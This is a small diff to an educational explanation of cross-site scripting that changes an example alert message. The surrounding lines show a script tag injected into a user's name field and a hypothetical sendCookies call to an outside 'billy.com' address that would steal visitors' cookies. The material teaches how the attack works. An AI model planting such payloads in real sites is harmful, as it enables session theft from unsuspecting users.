@@ -18,7 +18,7 @@ A website is vulnerable to cross-site scripting (XSS) attacks if users can enter
 Let's walk through a concrete example:
 
 1. NaiveSite allows you to enter your name, which is output as is on your profile page.
-2. Billy the Kid enters his name as `Billy <script>alert('Yo ho ho!')</script>`.
+2. Billy the Kid enters his name as `Billy <script>alert('Hello Bob!')</script>`.
 3. Anyone who visits Billy's profile page gets some HTML including the unescaped `script` tag, which their browser runs.
 4. If the `alert()` were changed to something more malicious, like `sendCookies('https://billy.com/cookie-monster')`, Billy may now be collecting the unsuspecting visitor's login information.
 
